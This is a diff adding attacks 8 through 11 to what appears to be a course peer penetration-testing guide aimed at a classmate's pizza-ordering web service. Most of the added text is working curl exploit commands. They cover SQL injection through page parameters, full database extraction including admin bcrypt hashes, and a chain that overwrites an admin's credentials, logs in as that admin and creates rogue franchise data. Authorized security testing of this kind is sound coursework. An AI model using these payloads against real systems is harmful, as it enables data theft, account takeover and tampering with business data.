@@ -102,7 +102,7 @@ Confirm: your `id`, `roles` (should be `diner`), and check for `exp` claim. Reco
 
 ## Phase 2: The Attacks
 
-You need at least 5 attacks for the deliverable. Below are 7 attacks covering 5 different OWASP categories. All have been confirmed vulnerable as of April 13, 2026.
+You need at least 5 attacks for the deliverable. Below are 11 attacks covering 5 different OWASP categories. All have been confirmed vulnerable as of April 13, 2026.
 
 ---
 
@@ -428,6 +428,303 @@ A malicious website at `https://evil-attacker.com` could include JavaScript that
 
 ---
 
+### Attack 8: SQL Injection via LIMIT/OFFSET Parameters (A03 Injection)
+
+**CONFIRMED VULNERABLE** — tested April 13, 2026.
+
+**What happens:** The `page` query parameter on `GET /api/order` and `GET /api/franchise` is interpolated directly into SQL LIMIT/OFFSET clauses via template literals. Injecting non-numeric values triggers errors that leak internal file paths and confirm the injection point. This is a separate injection vector from Attack 1.
+
+#### Step-by-step
+
+**8a. Inject a SQL string into the page parameter (orders endpoint):**
+
+```bash
+curl -s "https://pizza-service.marcosotomarino.com/api/order?page=1%3B%20SELECT%201" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+Expected: An error response with `"Undeclared variable: NaN"` and a full stack trace revealing `database.js:475` (query function), `database.js:223` (getOrders), and `orderRouter.js:117`.
+
+**8b. Use a negative page value to reveal LIMIT/OFFSET structure:**
+
+```bash
+curl -s "https://pizza-service.marcosotomarino.com/api/order?page=-1" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+Expected: SQL syntax error containing `near '-20,10'` — this confirms the page value is used to compute an offset (`(page - 1) * 10 = -20`) and a limit of 10, both interpolated directly into the SQL string.
+
+**8c. Confirm the same vulnerability on the franchise endpoint (no auth required):**
+
+```bash
+curl -s "https://pizza-service.marcosotomarino.com/api/franchise?page=1%3B%20SELECT%201"
+```
+
+Expected: Same `"Undeclared variable: NaN"` error, this time revealing `database.js:340` (getFranchises) and `franchiseRouter.js:83`. Note this endpoint doesn't even require authentication.
+
+**Record this as:** Severity 2 (Medium). OWASP A03 Injection. While JavaScript's type coercion to NaN prevents direct UNION-based extraction here, the error messages leak internal file paths and confirm unparameterized query patterns.
+
+---
+
+### Attack 9: SQL Injection — Full Database Extraction (A03 Injection)
+
+**CONFIRMED VULNERABLE** — tested April 13, 2026.
+
+**What happens:** Extending Attack 1's SQL injection in `PUT /api/user/:userId`, you can use a nested subquery technique to extract data from any table in the database. The key insight is injecting into the SET clause while preserving a WHERE clause that targets your own user, so the extracted data appears in the API response's `name` field.
+
+**WARNING:** This attack modifies your user's `name` field each time. The data you extract will be visible as your username until you clean it up.
+
+**Prerequisites:** You need a second test account for this attack. If you only have pentest2 (ID 17), register pentest3 first:
+
+```bash
+curl -s -X POST https://pizza-service.marcosotomarino.com/api/auth \
+  -H "Content-Type: application/json" \
+  -d '{"name":"pentest3","email":"pentest3@test.com","password":"pentest123"}'
+```
+
+Save the new user's ID and token. In the commands below, replace `<ID>` with your user ID (e.g., 22) and `$TOKEN` with a valid token.
+
+#### Technique explained
+
+The injection payload structure is:
+
+```sql
+-- What you send in the name field:
+x', name=(SELECT x FROM (SELECT <target_column> AS x FROM <target_table> WHERE <condition>) AS tmp) WHERE id=<YOUR_ID>--
+
+-- Resulting SQL on the server:
+UPDATE user SET name='x', name=(SELECT x FROM (SELECT <target_column> AS x FROM <target_table> WHERE <condition>) AS tmp) WHERE id=<YOUR_ID>-- ', email='...' WHERE id=<YOUR_ID>
+```
+
+The `-- ` comments out the rest of the query. The nested subquery (`SELECT x FROM (SELECT ... AS tmp)`) is needed to bypass MySQL's restriction against specifying the target table in a subquery of an UPDATE.
+
+#### Step-by-step
+
+**9a. Extract the full database schema — all table names:**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(table_name SEPARATOR '"'"'|'"'"') FROM information_schema.tables WHERE table_schema=database()) WHERE id=<ID>-- "}'
+```
+
+Expected: The response's `name` field contains all table names separated by `|`:
+
+```
+auth|dinerOrder|franchise|menu|orderItem|store|user|userRole
+```
+
+This reveals the complete database schema — 8 tables.
+
+**9b. Extract all user roles — identify admin accounts:**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(userId,'"'"':'"'"',role SEPARATOR '"'"'|'"'"') FROM userRole) WHERE id=<ID>-- "}'
+```
+
+Expected: The `name` field contains all role assignments like `1:diner|2:diner|3:diner|3:admin|2:admin|2:franchisee|...`. Look for users with the `admin` role — these are your high-value targets.
+
+**9c. Extract a password hash (for user 1):**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=1) AS tmp) WHERE id=<ID>-- "}'
+```
+
+Expected: The `name` field contains a bcrypt hash like `$2b$10$myn0NQ5XGs7cgGcbdajW6../AtiA8Wl/ql89aWrNegHSadJw4ACBG`.
+
+**9d. Extract password hash for an admin account (user 2):**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=2) AS tmp) WHERE id=<ID>-- "}'
+```
+
+**9e. Extract password hash for user 3 (another admin):**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=3) AS tmp) WHERE id=<ID>-- "}'
+```
+
+With these bcrypt hashes, an attacker could run offline cracking with `hashcat` or `john the ripper`.
+
+**9f. Clean up — restore your name:**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"pentest3"}'
+```
+
+**Record this as:** Severity 4 (Critical). OWASP A03 Injection. Complete database extraction — schema, all user roles, and bcrypt password hashes for every account including admins.
+
+---
+
+### Attack 10: Frontend Admin Dashboard Disclosure (A01 Broken Access Control)
+
+**CONFIRMED VULNERABLE** — tested April 13, 2026.
+
+**What happens:** The frontend is a React SPA served from CloudFront/S3. All routes serve the same `index.html` with the full JavaScript bundle. Any unauthenticated user can navigate to `/admin-dashboard` and the browser renders the admin UI components, revealing interface structure, API endpoint patterns, and management schemas. The `robots.txt` also advertises sensitive paths.
+
+#### Step-by-step
+
+**10a. Access the admin dashboard without authentication:**
+
+```bash
+curl -s "https://pizza.marcosotomarino.com/admin-dashboard" | head -15
+```
+
+Expected: The full HTML page with the SPA bundle (`index-CsPcqWP-.js`) is served. Open `https://pizza.marcosotomarino.com/admin-dashboard` in a browser to see the admin UI render client-side — take a screenshot for your records.
+
+**10b. Check robots.txt for advertised sensitive paths:**
+
+```bash
+curl -s "https://pizza.marcosotomarino.com/robots.txt"
+```
+
+Expected:
+
+```
+User-agent: *
+Disallow: /admin-dashboard/
+Disallow: /docs/
+```
+
+This tells every crawler (and attacker) exactly where the sensitive endpoints are. Disallowing a path in `robots.txt` does NOT restrict access — it just advertises it.
+
+**10c. Check version disclosure:**
+
+```bash
+curl -s "https://pizza.marcosotomarino.com/version.json"
+```
+
+Expected: `{"version":"20000101.000000"}` — frontend version publicly accessible.
+
+**Record this as:** Severity 2 (Medium). OWASP A01 Broken Access Control. Route protection is client-side only (React nav link visibility), not enforced at the route level. `robots.txt` advertises sensitive paths to attackers.
+
+---
+
+### Attack 11: Full Kill Chain — SQLi to Admin Takeover to Franchise Creation (A03 + A01)
+
+**CONFIRMED VULNERABLE** — tested April 13, 2026.
+
+**What happens:** This demonstrates a complete attack chain from a self-registered diner account to full administrative control of the system. You chain the SQL injection from Attacks 1/9 to overwrite an admin account's credentials with your own, log in as admin, and then create business data to prove full control.
+
+**WARNING:** This is the most destructive attack. It overwrites a real admin account's email and password. Coordinate with Marco before and after.
+
+**Prerequisites:** You need:
+- A test account (pentest3, ID `<ID>`) with a known password (`pentest123`)
+- The admin user IDs from Attack 9b (user 2 = admin + franchisee, user 3 = admin)
+- A valid `$TOKEN` for your test account
+
+#### Kill chain overview
+
+```
+Register diner account (pentest3, ID <ID>)
+    │
+    ▼
+SQLi: Extract userRole table → identify user 2 as admin       (Attack 9b)
+    │
+    ▼
+SQLi: Extract user 2's password hash                           (Attack 9d)
+    │
+    ▼
+SQLi: Overwrite user 2's email + password with known values    (Step 1 below)
+    │
+    ▼
+Login as user 2 → receive admin JWT                            (Step 2 below)
+    │
+    ▼
+Create franchise "Pwned Pizza" + store "Hacker HQ"             (Step 3 below)
+```
+
+#### Step-by-step
+
+**11a. Overwrite the admin's credentials via SQLi:**
+
+This injection copies your test account's password hash (which corresponds to the known password `pentest123`) onto user 2, and sets user 2's email to a value you control:
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"email":"pentest3@test.com","name":"x'"'"', email='"'"'admin-pwned@test.com'"'"', password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=<ID>) AS tmp) WHERE id=2-- "}'
+```
+
+The resulting SQL:
+
+```sql
+UPDATE user SET name='x', email='admin-pwned@test.com',
+  password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=<ID>) AS tmp)
+  WHERE id=2-- ', email='pentest3@test.com' WHERE id=<ID>
+```
+
+The response will show your own user (the endpoint returns the authenticated user), but the admin credential overwrite happened silently in the database.
+
+**11b. Log in as the admin:**
+
+```bash
+curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/auth" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin-pwned@test.com","password":"pentest123"}'
+```
+
+Expected: A response with `"id": 2` and roles including `admin`, `diner`, and `franchisee`. Save this admin token:
+
+```bash
+export ADMIN_TOKEN="<paste the admin token>"
+```
+
+**11c. Create a franchise as admin (proof of full control):**
+
+```bash
+curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"name":"Pwned Pizza","admins":[{"email":"pentest3@test.com"}]}'
+```
+
+Expected: `{"name":"Pwned Pizza","admins":[...],"id":4}` — a new franchise created under your control.
+
+**11d. Add a store to prove persistent business impact:**
+
+```bash
+curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise/4/store" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"name":"Hacker HQ"}'
+```
+
+Expected: `{"id":2,"franchiseId":4,"name":"Hacker HQ"}`
+
+**11e. Verify the final state:**
+
+```bash
+curl -s https://pizza-service.marcosotomarino.com/api/franchise
+```
+
+You should see "Pwned Pizza" with "Hacker HQ" alongside Marco's legitimate franchises.
+
+**11f. Clean up (coordinate with Marco):**
+
+With the admin token, you could restore the original admin email/password if you saved the original hash from Attack 9d. Otherwise, let Marco know so he can reset his admin credentials.
+
+**Record this as:** Severity 4 (Critical). OWASP A03 Injection / A01 Broken Access Control. Complete privilege escalation from anonymous registration to full admin control with persistent business impact. The root cause is the SQL injection — fixing parameterized queries in `database.js:updateUser()` blocks this entire chain.
+
+---
+
 ## Phase 3: Write Your Attack Records
 
 For each attack, use this table format:
@@ -465,19 +762,22 @@ After completing your attacks, merge everything into `peerTest.md`:
 
 ## Quick Reference: Confirmed Vulnerability Status (April 13)
 
-| Vulnerability                   | Status         | Attack # |
-| ------------------------------- | -------------- | -------- |
-| SQL injection (user update)     | **VULNERABLE** | 1        |
-| Unauth franchise deletion       | **VULNERABLE** | 2        |
-| Price manipulation (free pizza) | **VULNERABLE** | 3        |
-| Stack trace / info disclosure   | **VULNERABLE** | 4        |
-| CORS origin reflection          | **VULNERABLE** | 4, 7     |
-| DB host in /api/docs            | **VULNERABLE** | 4        |
-| Missing security headers        | **VULNERABLE** | 4        |
-| JWT forgery (default secret)    | **PATCHED**    | 5        |
-| No JWT expiry                   | **VULNERABLE** | 5        |
-| No rate limiting                | **VULNERABLE** | 6        |
-| Default admin credentials       | **PATCHED**    | N/A      |
+| Vulnerability                   | Status         | Attack #  |
+| ------------------------------- | -------------- | --------- |
+| SQL injection (user update)     | **VULNERABLE** | 1, 9, 11  |
+| SQL injection (LIMIT/OFFSET)    | **VULNERABLE** | 8         |
+| Unauth franchise deletion       | **VULNERABLE** | 2         |
+| Price manipulation (free pizza) | **VULNERABLE** | 3         |
+| Stack trace / info disclosure   | **VULNERABLE** | 4         |
+| CORS origin reflection          | **VULNERABLE** | 4, 7      |
+| DB host in /api/docs            | **VULNERABLE** | 4         |
+| Missing security headers        | **VULNERABLE** | 4         |
+| JWT forgery (default secret)    | **PATCHED**    | 5         |
+| No JWT expiry                   | **VULNERABLE** | 5         |
+| No rate limiting                | **VULNERABLE** | 6         |
+| Frontend admin disclosure       | **VULNERABLE** | 10        |
+| Full kill chain (admin takeover)| **VULNERABLE** | 11        |
+| Default admin credentials       | **PATCHED**    | N/A       |
 
 ## Quick Reference: Key Values
 
